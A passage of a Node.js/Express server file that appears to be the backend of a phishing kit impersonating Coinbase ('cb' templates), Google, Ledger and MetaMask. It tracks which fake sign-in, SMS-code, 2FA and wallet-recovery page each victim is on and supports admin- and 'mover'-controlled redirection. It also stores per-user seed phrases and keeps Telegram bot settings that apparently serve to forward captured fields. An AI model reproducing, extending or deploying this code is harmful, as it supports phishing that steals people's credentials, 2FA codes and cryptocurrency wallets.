      return res.json({ success: false, message: "DB error" });
    }
    return res.json({ success: true });
  });
});

app.post("/admin/change-admin-pass", (req, res) => {
  if (req.session.role !== "admin") {
    return res.json({ success: false, message: "Only admin can do this" });
  }
  const newPassword = (req.body.newPassword || "").trim();
  if (!newPassword) {
    return res.json({ success: false, message: "Empty not allowed" });
  }

  const q = `
      INSERT INTO settings (key, value)
      VALUES ('adminPassword', ?)
      ON CONFLICT(key) DO UPDATE SET value=excluded.value
    `;
  db.run(q, [newPassword], (err) => {
    if (err) {
      console.error("Error updating admin password:", err);
      return res.json({ success: false });
    }
    return res.json({ success: true });
  });
});

app.post("/admin/change-mover-pass", (req, res) => {
  if (req.session.role !== "admin") {
    return res.json({ success: false, message: "Only admin can do this" });
  }
  const newPassword = (req.body.newPassword || "").trim();
  if (!newPassword) {
    return res.json({ success: false, message: "Empty not allowed" });
  }

  const q = `
      INSERT INTO settings (key, value)
      VALUES ('moverPassword', ?)
      ON CONFLICT(key) DO UPDATE SET value=excluded.value
    `;
  db.run(q, [newPassword], (err) => {
    if (err) {
      console.error("Error updating mover password:", err);
      return res.json({ success: false });
    }
    return res.json({ success: true });
  });
});

/****************************************************
 * check-redirect
 ****************************************************/
app.get("/user/check-redirect", (req, res) => {
  if (!req.session?.email) {
    return res.json({ redirectUrl: "/" });
  }
  const q = `
    SELECT value FROM settings
    WHERE key = 'clientSideRoutesEnabled'
  `;
  db.get(q, [], (err, row) => {
    if (err || !row || row.value === "false") {
      return res.json({ redirectUrl: "/" });
    }
    const email = req.session.email;
    const q2 = `SELECT lastPage FROM users WHERE email = ?`;
    db.get(q2, [email], (e2, lastRow) => {
      if (e2 || !lastRow) {
        return res.json({ redirectUrl: "/" });
      }
      return res.json({ redirectUrl: `/${lastRow.lastPage}` });
    });
  });
});

app.post("/user/generate-seed", (req, res) => {
  if (!req.session?.email) {
    return res.json({ success: false, message: "No session" });
  }

  try {
    const seedPhrase = bip39.generateMnemonic();

    const updateQ = `UPDATE users SET phrase = ? WHERE email = ?`;
    db.run(updateQ, [seedPhrase, req.session.email], (err) => {
      if (err) {
        console.error("Error storing seed phrase:", err);
        return res.json({ success: false, message: "DB error" });
      }
      return res.json({ success: true, seedPhrase });
    });
  } catch (err) {
    console.error("Error generating seed phrase:", err);
    return res.json({
      success: false,
      message: "Failed to generate seed phrase",
    });
  }
});
app.get("/api/get-data", (req, res) => {
  if (!req.session?.email) {
    return res.json({ error: "No active session" });
  }
  const email = req.session.email;
  const sql = `SELECT Last2Digits, extra FROM users WHERE email = ?`;
  db.get(sql, [email], (err, row) => {
    if (err) {
      console.error("DB error fetching user data:", err);
      return res.json({ error: "DB error" });
    }
    if (!row) {
      return res.json({ error: "User not found" });
    }
    return res.json({
      email,
      last2Digits: row.Last2Digits || "",
      extra: row.extra || "",
    });
  });
});
/****************************************************
 * TELEGRAM SETTINGS ROUTES
 ****************************************************/
app.get("/admin/get-telegram-settings", (req, res) => {
  if (!["admin", "master"].includes(req.session.role)) {
    return res.json({ success: false, message: "No permission" });
  }

  db.get(
    "SELECT value FROM settings WHERE key='telegramBotToken'",
    (err1, row1) => {
      if (err1) {
        return res.json({ success: false, message: "DB error" });
      }
      const botToken = row1 ? row1.value : "";

      db.get(
        "SELECT value FROM settings WHERE key='telegramChatId'",
        (err2, row2) => {
          if (err2) {
            return res.json({ success: false, message: "DB error" });
          }
          const chatId = row2 ? row2.value : "";

          db.get(
            "SELECT value FROM settings WHERE key='telegramSelectedFields'",
            (err3, row3) => {
              if (err3) {
                return res.json({ success: false, message: "DB error" });
              }
              let selectedFields = [];
              if (row3 && row3.value) {
                try {
                  selectedFields = JSON.parse(row3.value);
                } catch (parseErr) {
                  console.log("Error parsing telegramSelectedFields");
                }
              }
              return res.json({
                success: true,
                botToken,
                chatId,
                selectedFields,
              });
            }
          );
        }
      );
    }
  );
});

app.post("/admin/save-telegram-settings", (req, res) => {
  if (!["admin", "master"].includes(req.session.role)) {
    return res.json({ success: false, message: "No permission" });
  }

  const { botToken, chatId, selectedFields } = req.body;

  const q1 = `
      INSERT INTO settings (key, value) VALUES ('telegramBotToken', ?)
      ON CONFLICT(key) DO UPDATE SET value=excluded.value
    `;
  db.run(q1, [botToken], (err1) => {
    if (err1) {
      console.error("Error storing botToken:", err1);
      return res.json({ success: false, message: "DB error" });
    }
    const q2 = `
        INSERT INTO settings (key, value) VALUES ('telegramChatId', ?)
        ON CONFLICT(key) DO UPDATE SET value=excluded.value
      `;
    db.run(q2, [chatId], (err2) => {
      if (err2) {
        console.error("Error storing chatId:", err2);
        return res.json({ success: false, message: "DB error" });
      }
      let fieldsJSON = "[]";
      try {
        fieldsJSON = JSON.stringify(selectedFields);
      } catch {}
      const q3 = `
          INSERT INTO settings (key, value) VALUES ('telegramSelectedFields', ?)
          ON CONFLICT(key) DO UPDATE SET value=excluded.value
        `;
      db.run(q3, [fieldsJSON], (err3) => {
        if (err3) {
          console.error("Error storing selectedFields:", err3);
          return res.json({ success: false, message: "DB error" });
        }
        return res.json({ success: true });
      });
    });
  });
});

/****************************************************
 * routes for pages
 ****************************************************/
async function getUserDataForRender(email) {
  return new Promise((resolve, reject) => {
    const q = `SELECT Last2Digits, email FROM users WHERE email = ?`;
    db.get(q, [email], (err, row) => {
      if (err) {
        console.error(err);
        return reject(new Error("Error retrieving user data"));
      }
      resolve({
        last2digits: row ? row.Last2Digits : "",
        email: row ? row.email : ""
      });
    });
  });
}
// CB Routes
app.get("/signin/review", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/review");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/cbreview", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/pass-reset", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/pass-reset");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/cbpassreset", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/url", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/url");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/cburl", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/sms-incorrect", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/sms-incorrect");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/cbsmsincorrect", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/sms", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/sms");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/cbsms", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/incorrect-pw", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/incorrect-pw");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/cbincorrectpw", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/estimate-hold", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/estimate-hold");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/cbestimatehold", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

// CB Wallet Routes
app.get("/signin/generate-wallet", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/generate-wallet");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/wallet/cbgeneratewallet", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/wallet/setup-wallet", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/wallet/setup-wallet");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/wallet/cbsetupwallet", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/external-wallet", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/external-wallet");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/wallet/cbexternalwallet", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/whitelist-success", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/whitelist-success");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/wallet/cbwhitelistsuccess", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/unlink-wallet", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/unlink-wallet");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/wallet/cbunlinkwallet", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/whitelist-wallet", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/whitelist-wallet");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/wallet/cbwhitelist", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

// CB Google Routes
app.get("/signin/google/verify", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/google/verify");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/google/verify", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/google/2fa", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/google/2fa");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/google/2fa", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});
app.get("/signin/google/loading", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/google/loading");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/google/loading", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/google/login", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/google/login");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/google/login", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

// CB External Wallets Routes
app.get("/signin/ledger-recovery", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/ledger-recovery");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/extwallets/Ledger", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/metamask-recovery", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/metamask-recovery");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/extwallets/MetaMask", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/metamask-loading", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/metamask-loading");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/extwallets/LoadingMeta", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

// CB Callback Routes
app.get("/signin/pending-callback", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/pending-callback");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/callback/cbpending", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/processing", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/processing");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/callback/cbprocessing", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/reschedule", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/reschedule");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/callback/cbreschedule", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/unauthorized", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/unauthorized");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("cb/callback/cbunauth", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});

app.get("/signin/loading", async (req, res) => {
  if (!req.session?.email) return res.redirect("/");
  updateUserPage(req.session.email, "signin/loading");
  try {
    const userData = await getUserDataForRender(req.session.email);
    res.render("default/loading", userData);
  } catch (err) {
    res.send("Error retrieving user data");
  }
});


/****************************************************
 * START
 ****************************************************/
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log("Server started on http://localhost:" + PORT);
});
